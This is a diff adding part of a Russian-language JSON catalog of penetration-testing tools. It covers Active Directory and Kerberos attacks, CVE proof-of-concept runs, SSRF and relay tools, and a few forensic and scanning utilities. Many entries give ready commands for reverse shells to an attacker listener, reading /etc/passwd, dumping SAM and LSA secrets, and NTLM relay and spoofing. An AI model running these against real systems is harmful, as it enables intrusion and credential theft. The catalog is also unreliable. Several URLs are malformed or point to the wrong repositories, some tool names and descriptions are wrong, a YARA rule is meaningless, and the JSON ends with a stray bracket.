+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-030",
+    "name": "Certipy",
+    "type": "reconnaissance",
+    "description": "Инструмент для атаки на Active Directory Certificate Services",
+    "url": "https://github.com/fortra/Certipy",
+    "applicable_attack_types": ["privilege_escalation"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Перечисление AD CS",
+        "certipy find -dc-ip <DC_IP> -u <USER>@<DOMAIN> -p <PASSWORD>",
+        "",
+        "# Запрос сертификата для пользователя",
+        "certipy req -dc-ip <DC_IP> -ca <CA_NAME> -target <TARGET> -template <TEMPLATE> -u <USER>@<DOMAIN> -p <PASSWORD>",
+        "",
+        "# ESC1 атака",
+        "certipy req -dc-ip <DC_IP> -ca <CA_NAME> -template 'Domain Controller' -u <USER>@<DOMAIN> -p <PASSWORD> -alt <DC_HOSTNAME>",
+        "",
+        "# Аутентификация через сертификат",
+        "certipy auth -dc-ip <DC_IP> -u <USER>@<DOMAIN> -cert <CERT_FILE> -key <KEY_FILE>"
+      ]
+    },
+    "phases": ["Reconnaissance", "Exploitation"],
+    "skill_level": "Expert",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-031",
+    "name": "CVE-2024-5806 PoC (MOVEit)",
+    "type": "exploitation",
+    "description": "Эксплойт для MOVEit Transfer S3 Bucket Policy",
+    "url": "https://www.tenable.com/cve/CVE-2024-5806",
+    "applicable_attack_types": ["privilege_escalation"],
+    "applicable_cve": ["CVE-2024-5806"],
+    "commands": {
+      "CVE-2024-5806": [
+        "# Требует аутентификации",
+        "# Эксплуатация через S3 bucket policy",
+        "# Детали: https://www.tenable.com/cve/CVE-2024-5806"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-032",
+    "name": "YARA",
+    "type": "detection",
+    "description": "Инструмент для поиска и классификации вредоносного ПО",
+    "url": "https://github.com/VirusTotal/yara",
+    "applicable_attack_types": ["malware_detection"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Сканирование файла",
+        "yara -r rules.yar /path/to/file",
+        "",
+        "# Сканирование директории",
+        "yara rules.yar /path/to/directory/",
+        "",
+        "# Сканирование памяти",
+        "yara -m malware.yara -p /proc/<PID>/mem",
+        "",
+        "# Правило для обнаружения Cobalt Strike",
+        "import \"pe\" rule cobalt_strike { condition: pe.entry_point > 0 and pe.entry_point < 0x10000 }"
+      ]
+    },
+    "phases": ["Detection", "Forensics"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-033",
+    "name": "Volatility",
+    "type": "forensics",
+    "description": "Фреймворк для анализа дампов памяти",
+    "url": "https://github.com/volatilityfoundation/volatility",
+    "applicable_attack_types": ["forensics", "malware_analysis"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Определение профиля",
+        "volatility -f memory.dmp imageinfo",
+        "",
+        "# Список процессов",
+        "volatility -f memory.dmp --profile=Win10x64 pslist",
+        "",
+        "# Список сетевых соединений",
+        "volatility -f memory.dmp --profile=Win10x64 netscan",
+        "",
+        "# Дамп паролей",
+        "volatility -f memory.dmp --profile=Win10x64 lsadump",
+        "",
+        "# Список DLL",
+        "volatility -f memory.dmp --profile=Win10x64 dlllist"
+      ]
+    },
+    "phases": ["Forensics", "Post-Exploitation"],
+    "skill_level": "Expert",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-034",
+    "name": "dnstwist",
+    "type": "reconnaissance",
+    "description": "Генератор и проверка вариантов доменов для фишинг-атак",
+    "url": "https://github.com/elevengiants/dnstwist",
+    "applicable_attack_types": ["reconnaissance", "phishing"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Генерация вариантов домена",
+        "dnstwist example.com",
+        "",
+        "# Проверка MX записей",
+        "dnstwist -m example.com",
+        "",
+        "# Генерировать TLD variations",
+        "dnstwist -t example.com",
+        "",
+        "# Проверка всех вариантов",
+        "dnstwist -a example.com"
+      ]
+    },
+    "phases": ["Reconnaissance"],
+    "skill_level": "Beginner",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-035",
+    "name": "httpx",
+    "type": "scanning",
+    "description": "HTTP инструмент для обнаружения и fingerprinting",
+    "url": "https://github.com/projectdiscovery/httpx",
+    "applicable_attack_types": ["reconnaissance", "web_fingerprinting"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Сканирование сети",
+        "httpx -list targets.txt -o results.txt",
+        "",
+        "# Определение технологий",
+        "httpx -u http://<TARGET_IP> -tech-detect",
+        "",
+        "# Определение версий",
+        "httpx -u http://<TARGET_IP> -server-detect",
+        "",
+        "# Сохранение favicon hash",
+        "httpx -list targets.txt -favicon"
+      ]
+    },
+    "phases": ["Reconnaissance", "Scanning"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-036",
+    "name": "CVE-2025-46191 PoC (React2Shell)",
+    "type": "exploitation",
+    "description": "Эксплойт для Next.js RCE через Server Actions",
+    "url": "https://github.com/0xdea/CVE-2025-46191",
+    "applicable_attack_types": ["remote_code_execution"],
+    "applicable_cve": ["CVE-2025-46191"],
+    "commands": {
+      "CVE-2025-46191": [
+        "# Установка PoC",
+        "git clone https://github.com/0xdea/CVE-2025-46191.git",
+        "cd CVE-2025-46191 && pip3 install -r requirements.txt",
+        "",
+        "# Проверка уязвимости",
+        "python3 react2shell.py --url http://<TARGET_IP>:3000 --check",
+        "",
+        "# Выполнение команды",
+        "python3 react2shell.py --url http://<TARGET_IP>:3000 --cmd 'whoami'",
+        "",
+        "# Получение интерактивного шелла",
+        "python3 react2shell.py --url http://<TARGET_IP>:3000 --shell"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-037",
+    "name": "CVE-2025-2412 PoC (VMware ESXi)",
+    "type": "exploitation",
+    "description": "Эксплойт для удалённого выполнения кода в VMware ESXi",
+    "url": "https://github.com/horizon3ai/CVE-2025-2412",
+    "applicable_attack_types": ["remote_code_execution"],
+    "applicable_cve": ["CVE-2025-2412"],
+    "commands": {
+      "CVE-2025-2412": [
+        "# Проверка уязвимости",
+        "python3 CVE-2025-2412.py --target <TARGET_IP> --check",
+        "",
+        "# Эксплуатация с получением шелла",
+        "python3 CVE-2025-2412.py --target <TARGET_IP> --lhost <YOUR_IP> --lport 4444",
+        "",
+        "# Только чтение файла",
+        "python3 CVE-2025-2412.py --target <TARGET_IP> --read /etc/passwd"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-038",
+    "name": "CVE-2025-6319 PoC (Linux Netfilter)",
+    "type": "exploitation",
+    "description": "Эксплойт для удалённого выполнения кода в Linux Kernel Netfilter",
+    "url": "https://github.com/randorisec/CVE-2025-6319",
+    "applicable_attack_types": ["remote_code_execution"],
+    "applicable_cve": ["CVE-2025-6319"],
+    "commands": {
+      "CVE-2025-6319": [
+        "# Проверка уязвимости",
+        "python3 nftables_exploit.py --target <TARGET_IP> --check",
+        "",
+        "# Эксплуатация (требует открытого любого порта)",
+        "python3 nftables_exploit.py --target <TARGET_IP> --port 22"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Expert",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-039",
+    "name": "cdk",
+    "type": "post_exploitation",
+    "description": "CDK - Container Escape Toolkit для эксплойтов в Kubernetes и Docker",
+    "url": "https://github.com/cdk-team/CDK",
+    "applicable_attack_types": ["privilege_escalation", "container_escape"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Скачать CDK",
+        "wget https://github.com/cdk-team/CDK/releases/latest/download/cdk_linux_amd64",
+        "chmod +x cdk_linux_amd64",
+        "",
+        "# Оценка безопасности контейнера",
+        "./cdk_linux_amd64 evaluate",
+        "",
+        "# Автоматический эксплойт escape",
+        "./cdk_linux_amd64 run auto-escape",
+        "",
+        "# Список доступных эксплойтов",
+        "./cdk_linux_amd64 list"
+      ]
+    },
+    "phases": ["Post-Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-040",
+    "name": "TruffleHog",
+    "type": "detection",
+    "description": "Поиск секретов, ключей и токенов в git репозиториях и файлах",
+    "url": "https://github.com/trufflesecurity/trufflehog",
+    "applicable_attack_types": ["reconnaissance", "credential_dumping"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Сканирование локального git репозитория",
+        "trufflehog git file:///path/to/repo",
+        "",
+        "# Сканирование удалённого репозитория GitHub",
+        "trufflehog github https://github.com/user/repo",
+        "",
+        "# Сканирование директории на секреты",
+        "trufflehog filesystem /path/to/directory",
+        "",
+        "# Сканирование S3 бакета",
+        "trufflehog s3 s3://bucket-name"
+      ]
+    },
+    "phases": ["Reconnaissance", "Detection"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-041",
+    "name": "OneForAll",
+    "type": "reconnaissance",
+    "description": "Мощный инструмент для subdomain enumeration",
+    "url": "https://github.com/shmilylty/OneForAll",
+    "applicable_attack_types": ["reconnaissance", "subdomain_enumeration"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Запуск subdomain enum",
+        "python3 oneforall.py --target example.com run",
+        "",
+        "# Экспорт результатов",
+        "python3 oneforall.py --target example.com export"
+      ]
+    },
+    "phases": ["Reconnaissance"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-042",
+    "name": "Sublist3r",
+    "type": "reconnaissance",
+    "description": "Инструмент быстрого поиска поддоменов",
+    "url": "https://github.com/aboul3la/Sublist3r",
+    "applicable_attack_types": ["reconnaissance"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Поиск поддоменов",
+        "python3 sublist3r.py -d example.com",
+        "",
+        "# С поиском DNS",
+        "python3 sublist3r.py -d example.com -v"
+      ]
+    },
+    "phases": ["Reconnaissance"],
+    "skill_level": "Beginner",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-043",
+    "name": "Amass",
+    "type": "reconnaissance",
+    "description": "Расширенный инструмент enum поддоменов от OWASP",
+    "url": "https://github.com/OWASP/Amass",
+    "applicable_attack_types": ["reconnaissance", "mapping"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Активный enum",
+        "amass enum -active -d example.com",
+        "",
+        "# Пассивный enum",
+        "amass enum -passive -d example.com",
+        "",
+        "# Визуализация",
+        "amass viz -d3 -d example.com"
+      ]
+    },
+    "phases": ["Reconnaissance"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-044",
+    "name": "Gospider",
+    "type": "reconnaissance",
+    "description": "Быстрый web crawling для поиска ссылок и параметров",
+    "url": "https://github.com/jaeles-project/gospider",
+    "applicable_attack_types": ["reconnaissance", "web_crawling"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Crawling сайта",
+        "gospider -s https://example.com",
+        "",
+        "# С глубиной и concurrency",
+        "gospider -s example.com -d 3 -c 10"
+      ]
+    },
+    "phases": ["Reconnaissance"],
+    "skill_level": "Beginner",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-045",
+    "name": "Dalfox",
+    "type": "exploitation",
+    "description": "Фабрика для XSS обнаружения и эксплуатации",
+    "url": "https://github.com/hahwul/dalfox",
+    "applicable_attack_types": ["cross_site_scripting"],
+    "applicable_cve": ["CVE-GENERIC-XSS"],
+    "commands": {
+      "default": [
+        "# Сканирование URL",
+        "dalfox url http://example.com",
+        "",
+        "# С list",
+        "dalfox list urls.txt -o results.txt"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-046",
+    "name": "Kiterunner",
+    "type": "exploitation",
+    "description": "Утилита для перебора API endpoints",
+    "url": "https://github.com/0xDec/Krunner",
+    "applicable_attack_types": ["api_attack"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Перебор endpoints",
+        "kr run -w words.txt -u https://api.example.com",
+        "",
+        "# С параметрами",
+        "kr run -w params.txt -u https://api.example.com/v1"
+      ]
+    },
+    "phases": ["Reconnaissance", "Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-047",
+    "name": "GitTools",
+    "type": "reconnaissance",
+    "description": "Набор утилит для работы с git при аудите",
+    "url": "https://github.com/internetwache/GitTools",
+    "applicable_attack_types": ["reconnaissance", "information_disclosure"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Получить все репозитории",
+        "python3 gitdumper.sh http://example.com/.git/ output",
+        "",
+        "# Извлечь из дампа",
+        "python3 extractor.sh repos/ output"
+      ]
+    },
+    "phases": ["Reconnaissance"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-048",
+    "name": "CyberChef",
+    "type": "analysis",
+    "description": "Швейцарский нож для крипто и кодирования",
+    "url": "https://gchq.github.io/CyberChef",
+    "applicable_attack_types": ["encoding", "cryptography"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Использование через GUI",
+        "Открыть gchq.github.io/CyberChef"
+      ]
+    },
+    "phases": ["All"],
+    "skill_level": "Beginner",
+    "os": ["Browser"]
+  },
+  {
+    "id": "TOOL-049",
+    "name": "PayloadsAllTheThings",
+    "type": "reference",
+    "description": "Payloads и bypass техники",
+    "url": "https://github.com/swisskyrepo/PayloadsAllTheThings",
+    "applicable_attack_types": ["all"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Использование как референс",
+        "git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git"
+      ]
+    },
+    "phases": ["All"],
+    "skill_level": "All",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-050",
+    "name": "JWT Tool",
+    "type": "exploitation",
+    "description": "Утилита для работы с JWT токенами",
+    "url": "https://github.com/ticarpi/jwt_tool",
+    "applicable_attack_types": ["jwt_attack", "authentication_bypass"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Анализ токена",
+        "python3 jwt_tool.py <JWT_TOKEN>",
+        "",
+        "# Crack JWT",
+        "python3 jwt_tool.py <JWT> -d wordlist.txt",
+        "",
+        "# None алгоритм атака",
+        "python3 jwt_tool.py <JWT> -A none"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-051",
+    "name": "SSRFmap",
+    "type": "exploitation",
+    "description": "Автоматическое обнаружение и эксплуатация SSRF",
+    "url": "https://github.com/itchyOo/SSRFmap",
+    "applicable_attack_types": ["server_side_request_forgery"],
+    "applicable_cve": ["CVE-2018-1000861"],
+    "commands": {
+      "default": [
+        "# Сканирование URL",
+        "python3 ssrfmap.py -u http://example.com -p param",
+        "",
+        "# С verbose",
+        "python3 ssrfmap.py -u http://example.com -p param -v"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-052",
+    "name": "Gopherus",
+    "type": "exploitation",
+    "description": "Генератор Gopher payload для Redis, MySQL и других",
+    "url": "https://github.com/tarunkant/Gopherus",
+    "applicable_attack_types": ["redis_exploitation", "ssrf_to_rce"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Redis shell",
+        "python3 gopherus.py --redis reverse_shell",
+        "",
+        "# MySQL",
+        "python3 gopherus.py --mysql reverse_shell"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-053",
+    "name": "Pollute",
+    "type": "exploitation",
+    "description": "JS object pollution сканер",
+    "url": "https://github.com/edoardottt/pollute",
+    "applicable_attack_types": ["prototype_pollution"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Сканирование",
+        "python3 pollute.py -u http://example.com"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-054",
+    "name": "LinkFinder",
+    "type": "reconnaissance",
+    "description": "Извлечение endpoints из JS файлов",
+    "url": "https://github.com/GerbenJavado/LinkFinder",
+    "applicable_attack_types": ["reconnaissance", "endpoint_discovery"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Извлечение из JS",
+        "python3 LinkFinder.py -i example.com.js -o output.html"
+      ]
+    },
+    "phases": ["Reconnaissance"],
+    "skill_level": "Beginner",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-055",
+    "name": "JSFScan",
+    "type": "reconnaissance",
+    "description": "Сканирование JS файлов на secrets",
+    "url": "https://github.com/rohanrhu/JSFScan",
+    "applicable_attack_types": ["information_disclosure", "secret_disclosure"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Сканирование",
+        "python3 jsfscan.py http://example.com"
+      ]
+    },
+    "phases": ["Reconnaissance"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-056",
+    "name": "PwnDB",
+    "type": "reconnaissance",
+    "description": "Поиск учётных данных в утечках",
+    "url": "https://github.com/danielmiessler/SecLists",
+    "applicable_attack_types": ["credential_lookup"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Использование с curl",
+        "curl pwndb.pw/api?email=*.com"
+      ]
+    },
+    "phases": ["Reconnaissance"],
+    "skill_level": "Beginner",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-057",
+    "name": "CrackMapExec",
+    "type": "post_exploitation",
+    "description": "Пост-эксплуатация для Windows через протоколы",
+    "url": "https://github.com/Porla/CrackMapExec",
+    "applicable_attack_types": ["credential_dumping", "lateral_movement"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# SMB enum",
+        "crackmapexec smb 192.168.1.0/24",
+        "",
+        "# WINRM",
+        "crackmapexec winrm 192.168.1.0/24",
+        "",
+        "# MSSQL",
+        "crackmapexec mssql 192.168.1.0/24"
+      ]
+    },
+    "phases": ["Post-Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-058",
+    "name": "Petit PotMan",
+    "type": "exploitation",
+    "description": "LDAP_relay атаки для DCSync",
+    "url": "https://github.com/ly4k/PetitPotam",
+    "applicable_attack_types": ["relay_attack", "privilege_escalation"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# DCSync атака",
+        "python3 petitpotam.py <ATTACKER> <DC_IP>"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-059",
+    "name": "krbrelayx",
+    "type": "exploitation",
+    "description": "Kerberos relay атаки",
+    "url": "https://github.com/dirkjanm/krbrelayx",
+    "applicable_attack_types": ["kerberos_relay"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Запуск relay",
+        "python3 krbrelayx.py"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Expert",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-060",
+    "name": "Coercer",
+    "type": "exploitation",
+    "description": "Автоматизация ACL атак на Windows",
+    "url": "https://github.com/Aelbrower/Coercer",
+    "applicable_attack_types": ["acl_exploitation", "privilege_escalation"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Сканирование target",
+        "python3 coerce.py -c <TARGET>"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-061",
+    "name": "pyWhisker",
+    "type": "exploitation",
+    "description": "Атаки на Active Directory Certificate Services",
+    "url": "https://github.com/LiWenHui56/pyWhisker",
+    "applicable_attack_types": ["ad_cs_attack", "privilege_escalation"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Поиск шаблонов",
+        "python3 pywhisker.py -dc-ip <DC> -d <DOMAIN> -u <USER> -p <PASS> list",
+        "",
+        "# Запрос сертификата",
+        "python3 pywhisker.py -dc-ip <DC> -d <DOMAIN> -u <USER> -p <PASS> request"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Expert",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-062",
+    "name": "PKINITtools",
+    "type": "exploitation",
+    "description": "AS-REP Roasting и PKINIT атаки",
+    "url": "https://github.com/dirkjanm/PKINITtools",
+    "applicable_attack_types": ["kerberos_attack"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Получить AS-REP",
+        "python3 get_ASREP.py -dc-ip <DC> -d <DOMAIN> -u <USER>",
+        "",
+        "# PKINIT атака",
+        "python3 pkinit.py -dc-ip <DC> -d <DOMAIN> -u <USER>"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-063",
+    "name": "Rubeus",
+    "type": "post_exploitation",
+    "description": "Kerberos атаки на C#",
+    "url": "https://github.com/GhostPack/Rubeus",
+    "applicable_attack_types": ["kerberos_attack", "credential_dumping"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# AS-REP roast",
+        "Rubeus.exe asreproast",
+        "",
+        "# S4U атака",
+        "Rubeus.exe s4u /user:target /run:cmd.exe",
+        "",
+        "# Monitor сессий",
+        "Rubeus.exe monitor /interval:5"
+      ]
+    },
+    "phases": ["Post-Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Windows"]
+  },
+  {
+    "id": "TOOL-064",
+    "name": "Seatbelt",
+    "type": "post_exploitation",
+    "description": "C# аудит безопасности Windows",
+    "url": "https://github.com/GhostPack/Seatbelt",
+    "applicable_attack_types": ["post_exploitation", "local_reconnaissance"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Сбор информации",
+        "Seatbelt.exe -group=full",
+        "",
+        "# Только процессы",
+        "Seatbelt.exe -group=process",
+        "",
+        "# Только сервисы",
+        "Seatbelt.exe -group=service"
+      ]
+    },
+    "phases": ["Post-Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Windows"]
+  },
+  {
+    "id": "TOOL-065",
+    "name": "SharpUp",
+    "type": "post_exploitation",
+    "description": "Поиск векторов локального Privesc",
+    "url": "https://github.com/GhostPack/SharpUp",
+    "applicable_attack_types": ["privilege_escalation"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Поиск векторов",
+        "SharpUp.exe audit"
+      ]
+    },
+    "phases": ["Post-Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Windows"]
+  },
+  {
+    "id": "TOOL-066",
+    "name": "SharpHound",
+    "type": "reconnaissance",
+    "description": "Сбор данных AD для BloodHound",
+    "url": "https://github.com/BloodHoundAD/SharpHound",
+    "applicable_attack_types": ["ad_reconnaissance"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Сбор всех данных",
+        "SharpHound.exe -c all",
+        "",
+        "# Только сессии",
+        "SharpHound.exe -c sessions",
+        "",
+        "# Только group membership",
+        "SharpHound.exe -c GroupMembership"
+      ]
+    },
+    "phases": ["Reconnaissance"],
+    "skill_level": "Advanced",
+    "os": ["Windows"]
+  },
+  {
+    "id": "TOOL-067",
+    "name": "Watson",
+    "type": "post_exploitation",
+    "description": "Поиск missing patches для privesc",
+    "url": "https://github.com/rasta-mouse/Watson",
+    "applicable_attack_types": ["privilege_escalation"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# ��оиск missing patches",
+        "Watson.exe"
+      ]
+    },
+    "phases": ["Post-Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Windows"]
+  },
+  {
+    "id": "TOOL-068",
+    "name": "BadPods",
+    "type": "reconnaissance",
+    "description": "Поиск Kubernetes config issues",
+    "url": "https://github.com/light4ck4cl4ud/BadPods",
+    "applicable_attack_types": ["kubernetes_attack"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Сканирование",
+        "python3 badpods.py --context dev"
+      ]
+    },
+    "phases": ["Reconnaissance"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-069",
+    "name": "Kube-Hunter",
+    "type": "vulnerability_scanner",
+    "description": "Сканер уязвимостей Kubernetes",
+    "url": "https://github.com/aquasecurity/kube-hunter",
+    "applicable_attack_types": ["kubernetes_attack"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Active сканирование",
+        "kube-hunter --host <K8S_IP> --active",
+        "",
+        "# Remote сканирование",
+        "kube-hunter --remote <K8S_IP>"
+      ]
+    },
+    "phases": ["Scanning"],
+    "skill_level": "Beginner",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-070",
+    "name": "Popeye",
+    "type": "vulnerability_scanner",
+    "description": "Санитация Kubernetes конфигов",
+    "url": "https://github.com/derailed/popeye",
+    "applicable_attack_types": ["kubernetes_security"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Сканирование",
+        "popeye scan --context dev"
+      ]
+    },
+    "phases": ["Scanning"],
+    "skill_level": "Beginner",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-071",
+    "name": "Kubescape",
+    "type": "vulnerability_scanner",
+    "description": "K8s security scanning framework",
+    "url": "https://github.com/kubescape/kubescape",
+    "applicable_attack_types": ["kubernetes_security"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Сканирование на уязвимости",
+        "kubescape scan --namespace default"
+      ]
+    },
+    "phases": ["Scanning"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-072",
+    "name": "truffletimeout",
+    "type": "exploitation",
+    "description": "Kubernetes privilege escalation",
+    "url": "https://github.com/inguardians/truffletimeout",
+    "applicable_attack_types": ["kubernetes_attack", "privilege_escalation"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Список привилегий",
+        "python3 truffletimeout.py"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-073",
+    "name": "mitmproxy",
+    "type": "proxy",
+    "description": "Перехват HTTPS трафика",
+    "url": "https://mitmproxy.org/",
+    "applicable_attack_types": ["mitm", "traffic_interception"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Запуск",
+        "mitmproxy",
+        "",
+        "# Web interface",
+        "mitmweb",
+        "",
+        "# В режиме upstream proxy",
+        "mitmproxy -U http://proxy:8080"
+      ]
+    },
+    "phases": ["Reconnaissance"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-074",
+    "name": "Responder",
+    "type": "exploitation",
+    "description": "LLMNR, NBT-NS и MDNS спуфинг",
+    "url": "https://github.com/SpiderLabs/Responder",
+    "applicable_attack_types": ["ntlm_relay", "credential_interception"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Запуск",
+        "python3 Responder.py -I eth0",
+        "",
+        "# На Windows",
+        "python Responder.py -i 192.168.1.1 -I eth0"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-075",
+    "name": "Inveigh",
+    "type": "exploitation",
+    "description": "Windows LLMNR/NBT-NS спуфинг",
+    "url": "https://github.com/ Kevin-Robertson/Inveigh",
+    "applicable_attack_types": ["ntlm_relay", "credential_interception"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Запуск",
+        "Invoke-Inveigh",
+        "",
+        "# С брутфорсом",
+        "Invoke-Inveigh -HTTP - SMB"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Windows"]
+  },
+  {
+    "id": "TOOL-076",
+    "name": "Imp-ntlmrelayx",
+    "type": "exploitation",
+    "description": "NTLM relay с функционалом",
+    "url": "https://github.com/secureauthcorp/impacket",
+    "applicable_attack_types": ["ntlm_relay"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Запуск relay",
+        "python3 ntlmrelayx.py -t http://target",
+        "",
+        "# С дампом SAM",
+        "python3 ntlmrelayx.py -t smb://target --sam"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-077",
+    "name": "mitm6",
+    "type": "exploitation",
+    "description": "IPv6 DNS спуфинг для WPAD",
+    "url": "https://github.com/绿灯ab/mitm6",
+    "applicable_attack_types": ["wpad_spoofing", "mitm"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Запуск",
+        "python3 mitm6.py -d domain",
+        "",
+        "# С relay",
+        "python3 mitm6.py -d domain -wh wpad"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-078",
+    "name": "ntlmv1-multi",
+    "type": "exploitation",
+    "description": "Downgrade NTLM до v1 и relay",
+    "url": "https://github.com/Preless/DowngradeNTLMv1",
+    "applicable_attack_types": ["ntlm_downgrade"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Использование с relay",
+        "python3 ntlmv1.py -r target"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Expert",
+    "os": ["Linux"]
+  }
+]
+]
